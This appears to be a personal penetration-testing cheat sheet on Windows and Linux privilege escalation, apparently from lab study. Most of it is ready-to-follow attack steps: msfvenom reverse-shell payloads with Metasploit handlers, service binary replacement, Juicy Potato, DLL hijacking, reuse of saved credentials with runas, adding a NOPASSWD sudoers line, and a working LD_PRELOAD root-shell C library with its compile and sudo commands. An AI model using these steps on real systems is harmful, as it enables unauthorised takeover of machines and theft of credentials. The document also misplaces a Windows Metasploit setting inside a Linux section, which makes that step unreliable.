# PrivEsc

### PowerUp

PowerUp is populor tool used in context of Windows privilege escalation.
- Part of PowerSploit framework
- Automate the process of scanning a Windows system for potential misconfigurations, vulns that could lead to privilege escalation.

**Steps**:
- Get access and get [Powersploit](https://github.com/PowerShellMafia/PowerSploit) on victim machine
- `powershell -ep bypass`
- Import module PowerSploit `Import-Module PowerSploit` or `Import-Module .\PowerSploit`
    - `Get-Command -Module PowerSploit` Get available module
- Run `Invoke-privescAudit` Check potential exploit for privilege
- `Get-UnquotedService` check for unquoted service paths which could potentially allow for privilege escalation
- `Get-ModifiableService` check for the services that the current user can modify

### Unattend installation file
- Some service can leave config file after installation (like Unattended Windows Setup)
  - `C:\Windows\Panther\Unattend.xml`
  - `C:\Windows\Panther\Autounattend.xml`

Check the system is contain those file, and extract infomation from that.

### Windows Credential Manager

Windows Credential Manager is a built in feature in Microsoft Windows that allow users to securely store and manage credential

`cmdkey` is a command line utility in Windows that interact with Windows Credential Manager. With `cmdkey` you can:
- Add Credential
- List Credential
- Delete Credential

**Steps**:
- Start `powershell` -> `cmdkey /list` ~ List save cred that we can use.
- `runas.exe /savecred /user:administrator cmd` Use save credential, no need to input password

For remote control:
- `msfvenom -p windows/x64/.../reverse_tcp ... -f exe -o shell.exe`
- Use module `web_delivery` -> Set up host and port and payload like msfvenom -> Run -> Set the powershell command
- Run powershell command on victim machine
- Upload the `shell.exe`
- Set up `multi/handler` and run `shell.exe`

### Powershell history

- Check the history with first, apply `show hidden file`
- Goto user folder `AppData/Roaming/Microsoft/Windows/Powershell/PSReadline` 
- Open the `ConsoleHost_History` File with notepad

### Insecure Service Permissions

We can use tool like powerUp, AccessChk to automate check. When Identified the vuls service, Attacker modify the service config and restart the service

Attack vector:
- Service Binary Replacement
- Unquoted Service Path Exploitation
- DLL Hijacking in Services
- Weak Permissions on Service Configuration (Registry)
- Service Permission Manipulation
- Insecure Service Restart Behavior
- Path Interception (Environment Variables)

**Steps**:
- Use `msfvenom -p windows/meterpreter/reverse_tcp .... -f exe > "FileZilla Server.exe"` to generate payload
- Setup the `multi/handler` -> set InitialAutoRunScript `post/windows/manage/migrate` 
- Replace the payload with actual exe
- Restart the service   

### Juicy Potato

Juicy Potato is a Windows privilege escalation exploit that leverages specific vulnerabilities related to DCOM (Distributed Component Object Model) and the way Windows manages the communication between processes and services. 

**StepS:**
- After gain initial access, we can upload the backdoor.exe (msfvenom, reverse_tcp to Kali) and `Juicy_Potato.exe`
  - [Github repo](https://github.com/ohpe/juicy-potato)
- Setup multi/handler for the payload above
- Back to first meterpreter -> shell -> `JuicyPotato.exe -l 5555 -p <path_to_backdoor> -t * -c <cls_id>`

`Cls_id` Input is the COM that we targeted
- [Definition](https://learn.microsoft.com/en-us/windows/win32/com/clsid-key-hklm)
- [How to found correct id](https://github.com/ohpe/juicy-potato/tree/master/CLSID)

### DLL Hijacking

DLL Hijacking is a privilege escalation technique where an attacker manipulates the way windows application load DLL to execute malicious code with elevated privilege

Understand Default Search Order: Windows has a predefined order for searching for DLLs. It generally starts with the application's directory, followed by the system directories, and then other system-defined paths.

Common locations include:
- The application's current working directory.
- The System32 or SysWOW64 directories.
- Directories listed in the PATH environment variable.
- Other directories included in the search order.

You need to be able to make change one of these folder

- Inject the malicous dll, then the programs will load the malicious dll

Tools:
- DVTA (Our target)
- Promon

**Steps:**
- Procmon filter `CreateFile` -> Run DVTA
- Procmon filter ProcessName is `DVTA.exe`
- Filter result that `NAME NOT FOUND`, searching for dll that process not found and the folder that we can access
- Check the ACL with `Get-ACL '/path/to/folder/' | Format-list
- `msfvenom -p windows/meterpreter/reverse_tcp LHOST ... -f dll > payload.dll`
- Ship the payload and setup multi/handler -> Place the dll to correct folder

## Linux

### Local store

Looking for folder maybe contain config

- `grep -nr "password"` Grep content

### SUID

`find / -perm -u=s -type f 2>/dev/null` - Looking for binary that have root privilege

We can looking for change the content of `/etc/sudoer` file.
- Add this line `<user> ALL=(ALL) NOPASSWD:ALL`

### Share library inject

Several techniques can be used to inject a shared library into a running process:
- Using LD_PRELOAD: This environment variable specifies a shared library to be loaded before any other libraries. By setting this variable, an attacker can preload a malicious shared library into a process.
- Process Control (ptrace): The ptrace system call allows a process to control another process, typically used for debugging. Attackers can use ptrace to inject code into a running process, causing it to load a malicious shared library

Steps:
- Check with `sudo -l`
  - Looking for LD_PRELOAD privilege
- Create a malicious dll

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
  unsetenv("LD_PRELOAD");
  setgid(0);
  setuid(0);
  system("/bin/sh");
}
```

Compile `gcc -fPIC -shared -o shell.so shell.c -nostartfiles`

Run `sudo LD_PRELOAD=/home/student/shell.so apache2`
- Setup the `multi/handler`
  - `set InitialAutoRunScript post/windows/manage/migrate` Set to run migrate after getting access (To keep session alive)

### Via Registry autorun

Registry that control autoruns and check their permission, if it have weak permission, write value of registry point to a malicious executable or script.

Typical registry keys associated with autoruns include:
- HKLM\Software\Microsoft\Windows\CurrentVersion\Run
- HKCU\...\CurrentVersion\Run
- HKLM\System\CurrentControlSet\Services

`Get-ACL "C:\Program Files\HTTPServer\" | Format-List` ~ Get access control of folder

### Access token

- Impersonate-level tokens are created as a direct result of a non-interactive login on Windows, typically through specific system services or domain logons.
- Delegate-level tokens are typically created through an interactive login on Windows, primarily through a traditional login or through remote access protocols such as RDP.
